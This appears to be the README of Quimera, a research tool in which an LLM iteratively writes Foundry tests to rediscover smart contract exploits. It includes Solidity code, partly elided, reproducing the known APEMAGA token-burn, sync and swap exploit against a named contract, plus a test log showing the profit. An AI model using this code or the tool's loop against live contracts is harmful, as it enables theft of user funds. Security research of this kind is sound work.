# Quimera

This is a basic tool that uses large language models (LLMs) to gradually discover smart contract exploits in Foundry by following these steps:

1. Get the smart contract's source code and write a prompt that describes the goal of the exploit (e.g., the balance should increase after a flashloan).

2. Ask the LLM to create or improve a Foundry test case that tries to exploit the contract.

3. Run the test, check the transaction trace, and see if it made a profit.

4. If it did, stop. If not, go back to step 2 and give the LLM the trace from the failed attempt to help it improve.

**Current Status**: This is an experimental prototype. We’re still figuring out the best settings (like the right temperature), how to write better prompts, and what the tool is really capable of. Right now, it's focused on simple exploits involving token manipulation through Uniswap pairs. Follow the discussion on [the rediscovered exploits here](https://github.com/gustavo-grieco/quimera/issues/6).

# Requirements

* You will need an RPC provider (e.g. Alchemy) and an Etherscan API key. Both have free options.
* An LLM service, either a local (e.g. ollama) or remote LLM service (e.g gemini). **You do not need to pay for an API access, specially if you use "manual mode"**
* [Foundry](https://book.getfoundry.sh/)

# Installation

To install, just run:

```
pip3 install https://github.com/gustavo-grieco/quimera/archive/refs/heads/main.zip
```

If you want to use [different LLM providers](https://llm.datasette.io/en/stable/plugins/directory.html#plugin-directory), you will need to install them as plugins. For instance, to install gemini and ollama support:

```
llm install llm-gemini
llm install llm-ollama
```

Note that in "manual mode", there is no need to install any plugin as the user will be copying and pasting the prompt and responses.

**Important**: when using an LLM to test with an already known exploit, make sure the web search is not enabled, otherwise they can will have access to the original exploit code.


# Getting started

1. Modify the keys.sh file to add the RPC and Etherscan keys.
2. Select a block number `B` and then execute `source keys.sh B`
3. Invoke Quimera:

```
quimera TARGET --model gpt-4o --iterations 5
```

You can use `llm models` to show the available models.

# Running modes

Quimera can work with either deployed contracts (using Etherscan to fetch the source code) or in local mode with a Foundry codebase. To see an example how to use it locally, check the [tests/erc4626](tests/erc4626) directory. It imports the OpenZepelin ERC4626 vault which is instantiated using WETH in the tests. To use quimera, you must define a QuimeraBase contract in the [`test/quimera/QuimeraBase.t.sol`](tests/erc4626/test/quimera/QuimeraBase.t.sol) similar to the example one.

# Example session

This session shows the different steps to re-discover the [APEMAGA exploit](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/dc2cf9e53e9ccaf2eaf9806bad7cd914edefb41b/src/test/2024-06/APEMAGA_exp.sol#L23).
While it is likely that this code is part of the millons used to train, Gemini does not seem to be immediately recalling the exploit from memory, but instead, it seems to be trying to understand the code (at least, in some degree).

```
source keys.sh 20175261
quimera 0x56FF4AfD909AA66a1530fe69BF94c74e6D44500C --model manual --iterations 20
```

Gemini 2.5 Pro Preview (05-06) was used in "manual mode" from [Google AI Studio](https://aistudio.google.com/) (which seem to be unlimited right now) copying and pasting the prompt/answers. It took 5 attempts to reach a valid exploit. I omitted some steps where Gemini fixed some compilation errors or repeated the same output.

The first attempt correctly swaps tokens, triggers the `family` function which is root cause, and tries to swaps token back:

```solidity
function receiveFlashLoan(
    ...
) external {
    // 'token' is the address of the Tonken contract, available as a state variable in TestFlaw
    // 'WETH' is the IWETH interface for WETH token, available as a state variable
    // 'uniswapRouter' is IUniswapV2Router, available as a state variable
    // 'uniswapPair' is IUniswapV2Pair, available as a state variable

    uint256 amountWethToSwap = 10 ether;

    // 1. Swap WETH for Tonken
    // Path: WETH -> Tonken
    address[] memory pathWethToToken = new address[](2);
    pathWethToToken[0] = address(WETH);
    pathWethToToken[1] = token;

    // Approvals for router are done in setUp()

    // console.log("WETH balance before swap: %s", WETH.balanceOf(address(this)));
    // console.log("Swapping %s WETH for Tonken...", amountWethToSwap);
    // Use swapExactTokensForTokens as Tonken does not seem to have transfer fees based on provided code
    uniswapRouter.swapExactTokensForTokens(
        amountWethToSwap,
        0, // amountOutMin: willing to accept any amount of Tonken
        pathWethToToken,
        address(this), // recipient of Tonken is this contract
        block.timestamp // deadline
    );
    uint256 initialTonkenBalance = ERC20(token).balanceOf(address(this));
    // console.log("Received %s Tonken. WETH balance after swap: %s", initialTonkenBalance, WETH.balanceOf(address(this)));
    // console.log("Uniswap pair Tonken balance before family call: %s", ERC20(token).balanceOf(address(uniswapPair)));


    // 2. Call Tonken.family() on the Uniswap pair address
    // console.log("Calling Tonken.family() on Uniswap pair %s", address(uniswapPair));
    ITonken(token).family(address(uniswapPair));
    // console.log("Called Tonken.family(). Uniswap pair Tonken balance after family call: %s", ERC20(token).balanceOf(address(uniswapPair)));


    // 3. Get the current balance of Tonken held by this contract
    uint256 tonkenBalanceToSwapBack = ERC20(token).balanceOf(address(this));
    // console.log("Tonken balance to swap back: %s", tonkenBalanceToSwapBack);
    require(tonkenBalanceToSwapBack > 0, "No Tonken to swap back");


    // 4. Swap all Tonken back to WETH
    // Path: Tonken -> WETH
    address[] memory pathTokenToWeth = new address[](2);
    pathTokenToWeth[0] = token;
    pathTokenToWeth[1] = address(WETH);

    // console.log("Swapping back %s Tonken for WETH...", tonkenBalanceToSwapBack);
    // Use swapExactTokensForTokens
    uniswapRouter.swapExactTokensForTokens(
        tonkenBalanceToSwapBack,
        0, // amountOutMin: willing to accept any amount of WETH
        pathTokenToWeth,
        address(this), // recipient of WETH is this contract
        block.timestamp // deadline
    );
    // console.log("Swapped Tonken back to WETH. WETH balance: %s", WETH.balanceOf(address(this)));

    // DO NOT MODIFY THE FOLLOWING CODE
    ...
}
```

Then, it realizes that the Uniswap pair has not updated its reserves, so it calls `sync`.

```solidity
function receiveFlashLoan(
    ...
) external {
    // 'token' is the address of the Tonken contract, available as a state variable in TestFlaw
    // 'WETH' is the IWETH interface for WETH token, available as a state variable
    // 'uniswapRouter' is IUniswapV2Router, available as a state variable
    // 'uniswapPair' is IUniswapV2Pair, available as a state variable

    uint256 amountWethToSwap = 100 ether; // Increased amount for better reserve manipulation

    // 1. Swap WETH for Tonken
    // Path: WETH -> Tonken
    address[] memory pathWethToToken = new address[](2);
    pathWethToToken[0] = address(WETH);
    pathWethToToken[1] = token;

    // Approvals for router are done in setUp()

    // console.log("WETH balance before 1st swap: %s", WETH.balanceOf(address(this)));
    // console.log("Swapping %s WETH for Tonken...", amountWethToSwap);
    uniswapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
        amountWethToSwap,
        0, // amountOutMin: willing to accept any amount of Tonken
        pathWethToToken,
        address(this), // recipient of Tonken is this contract
        block.timestamp // deadline
    );
    uint256 initialTonkenBalance = ERC20(token).balanceOf(address(this));
    // console.log("Received %s Tonken. WETH balance after 1st swap: %s", initialTonkenBalance, WETH.balanceOf(address(this)));
    // console.log("Uniswap pair Tonken balance before family call: %s", ERC20(token).balanceOf(address(uniswapPair)));
    // console.log("Uniswap pair WETH balance before family call: %s", WETH.balanceOf(address(uniswapPair)));

    // 2. Call Tonken.family() on the Uniswap pair address
    // This burns 99.9% of the Tonken from the Uniswap pair's balance directly in Tonken contract.
    // console.log("Calling Tonken.family() on Uniswap pair %s", address(uniswapPair));
    ITonken(token).family(address(uniswapPair));
    // console.log("Called Tonken.family().");
    // console.log("Uniswap pair Tonken balance (actual) after family call: %s", ERC20(token).balanceOf(address(uniswapPair)));
    // (Pair's internal reserves are now stale)

    // 3. Synchronize Uniswap pair reserves
    // This updates the pair's internal reserves to match its actual (now very low) Tonken balance.
    // console.log("Calling uniswapPair.sync()...");
    uniswapPair.sync();
    // console.log("Called uniswapPair.sync().");
    // (Pair's internal Tonken reserve should now be very low)
    // (Pair's internal WETH reserve reflects WETH deposited in step 1)

    // 4. Get the current balance of Tonken held by this contract to swap back
    uint256 tonkenBalanceToSwapBack = ERC20(token).balanceOf(address(this));
    // console.log("Tonken balance to swap back: %s", tonkenBalanceToSwapBack);
    require(tonkenBalanceToSwapBack > 0, "No Tonken to swap back");


    // 5. Swap all Tonken back to WETH
    // Path: Tonken -> WETH
    address[] memory pathTokenToWeth = new address[](2);
    pathTokenToWeth[0] = token;
    pathTokenToWeth[1] = address(WETH);

    // console.log("Swapping back %s Tonken for WETH...", tonkenBalanceToSwapBack);
    // console.log("WETH balance before 2nd swap: %s", WETH.balanceOf(address(this)));
    uniswapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
        tonkenBalanceToSwapBack,
        0, // amountOutMin: willing to accept any amount of WETH
        pathTokenToWeth,
        address(this), // recipient of WETH is this contract
        block.timestamp // deadline
    );
    // console.log("Swapped Tonken back to WETH. Final WETH balance before repay: %s", WETH.balanceOf(address(this)));

    // DO NOT MODIFY THE FOLLOWING CODE
    ...
}
```

Finally, this code produces the correct exploit:

```
Ran 1 test for test/Test.t.sol:TestFlaw
[PASS] testFlaw() (gas: 194413)
Logs:
  Initial balance 0
  Surplus: 9136264858651799299 WETH
  Final balance 9136264858651799299
```
